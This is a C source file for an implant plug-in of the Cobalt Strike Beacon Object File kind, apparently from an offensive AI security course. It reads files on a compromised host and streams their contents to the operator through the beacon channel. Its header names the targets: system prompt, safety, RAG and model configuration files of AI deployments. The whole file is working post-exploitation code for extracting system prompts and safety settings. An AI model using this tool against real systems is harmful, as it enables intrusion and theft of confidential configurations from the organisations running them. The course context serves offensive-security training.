/*
 * configDump.c — targeted AI config file dumper (OSAI T2).
 * Course: M2.4 (system.txt/safety.yaml/rag.yaml/models.yaml), M7.1.1 config.yaml.
 *         ATLAS recon / OWASP LLM07.  Replaces `type`/`Get-Content`/`cat` chains.
 *
 * args: str pathCsv  (semicolon-separated paths)
 */
#include "aibof.h"

static void dump_one(const char* path) {
  unsigned char* buf = NULL; DWORD got = 0;
  if (!read_file(path, &buf, &got, 65535)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] %s (unreadable)\n", path);
    return;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "===== %s (%lu bytes) =====\n", path, got);
  /* emit in line-sized chunks so beacon output stays readable */
  DWORD off = 0;
  while (off < got) {
    DWORD chunk = got - off; if (chunk > 4000) chunk = 4000;
    /* NUL-terminate chunk for %s (we allocated +1 in read_file) */
    char save = (char)buf[off + chunk];
    buf[off + chunk] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "%s", (char*)(buf + off));
    buf[off + chunk] = save;
    off += chunk;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "\n===== /%s =====\n", path);
  intFree(buf);
}

void go(char* args, int alen) {
  datap p; BeaconDataParse(&p, args, alen);
  char* csv = BeaconDataExtract(&p, NULL);
  if (!csv || !*csv) { BeaconPrintf(CALLBACK_ERROR, "usage: configDump <path;path;...>\n"); return; }
  /* split on ';' */
  char* s = csv;
  while (*s) {
    char* e = xstrstr(s, ";");
    if (e) *e = 0;
    if (*s) dump_one(s);
    if (!e) break;
    *e = ';';
    s = e + 1;
  }
  BeaconPrintf(CALLBACK_OUTPUT, "[*] configDump done\n");
}